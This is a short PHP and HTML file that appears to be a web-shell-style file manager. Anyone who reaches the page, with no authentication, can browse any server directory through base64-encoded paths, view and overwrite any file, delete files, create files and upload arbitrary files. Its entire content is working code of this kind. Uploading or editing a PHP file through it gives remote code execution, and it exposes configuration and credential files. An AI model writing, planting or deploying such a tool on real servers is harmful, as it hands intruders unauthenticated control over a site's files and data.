<!DOCTYPE html>
<html>
<body>
<form action="<?php echo htmlspecialchars($_SERVER['REQUEST_URI']);?>" method="post" enctype="multipart/form-data" id="fileuplod">
    <input type="text" placeholder="File name" name="filename" id="filename">
  <input type="file" name="file" id="fileToUpload">
  <input type="submit" value="Submit" name="submit">
  <button type"reset">Reset</button>
</form>
</body>
</html>


<?php
if(isset($_GET['cd'])){
    $cdir = urldecode($_GET['cd']);
    chdir(base64_decode($cdir));
    
    if(isset($_GET['del'])){
        $file = urldecode($_GET['del']);
        unlink($file);
    }else{
        if(isset($_GET['cat'])){
            $file = urldecode($_GET['cat']);
            readFileContent($file);
        }
    }
}

$dir = getcwd();
//echo $dir;
$dirsplit = explode("/",$dir);
$tmpdir = "";
foreach ($dirsplit as $value) {
    $tmpdir .= $value."/";
    echo '<a href="'.$_SERVER['PHP_SELF'].'?cd='.base64_encode($tmpdir).'">'.$value.'</a>/';
    //$tmpdir .= "/";
}

$a = scandir($dir);
foreach ($a as $value) {
if(!is_dir($value)){
$edit = change_query($_SERVER['REQUEST_URI'], array('cat'=>$value));
$del = change_query($_SERVER['REQUEST_URI'], array('del'=>$value));
echo '<hr>'.$value .' &emsp;<a href="'.$edit.'">Edit</a> &emsp;'.sizeFilter(filesize($value)) .'&emsp;'. date("F d Y H:i:s.", filemtime($value)).' <a href="'.$del.'" style="float: right;">Delete</a> ';
}else{
echo '<hr> <a href="?cd='.base64_encode($dir.'/'.$value).'">'.$value.'</a> ';
}
} 

if(isset($_POST["submit"])) {
    if($_FILES["file"]["tmp_name"] != ""){
        echo "uploaded";
        move_uploaded_file($_FILES["file"]["tmp_name"], "" . $_FILES["file"]["name"]);
    }else{
       if($_POST['filename'] != ""){
            $filename = $_POST['filename'];
            touch($filename);
        }
    }
    
}

if(isset($_POST["save"])) {
   if($_POST['code'] != ""){
        $code = $_POST['code'];
        $myfile = fopen($_GET['cat'], "w") or die("Unable to open file!");
        fwrite($myfile, $code);
    	fclose($myfile);
    }
    
}



function readFileContent($filename){
    $content =  file_get_contents($filename);
    /*$file = "test.php";
    $fp = fopen($file, "r");
    while(!feof($fp)) {
        $data .= fgets($fp, filesize($file));
    }
    fclose($fp);*/
   $code = htmlspecialchars($content);
   echo '<form action="'.$_SERVER['REQUEST_URI'].'" method="post" enctype="multipart/form-data" id="fileuplod">';
   echo ' </br></br><textarea name="code" style="width: 100%;height: 50vh;">'.$code."</textarea>";
   echo '<input type="submit" value="Save" name="save"><button type"reset">Reset</button></form>';
}
    
function change_query ( $url , $array ) {
    $url_decomposition = parse_url ($url);
    $cut_url = explode('?', $url);
    $queries = array_key_exists('query',$url_decomposition)?$url_decomposition['query']:false;
    $queries_array = array ();
    if ($queries) {
        $cut_queries   = explode('&', $queries);
        foreach ($cut_queries as $k => $v) {
            if ($v)
            {
                $tmp = explode('=', $v);
                if (sizeof($tmp ) < 2) $tmp[1] = true;
                $queries_array[$tmp[0]] = urldecode($tmp[1]);
            }
        }
    }
    $newQueries = array_merge($queries_array,$array);
    return $cut_url[0].'?'.http_build_query($newQueries);
}
    
function sizeFilter( $bytes ){
    $label = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB' );
    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
    return( round( $bytes, 2 ) . " " . $label[$i] );
}
    
?>

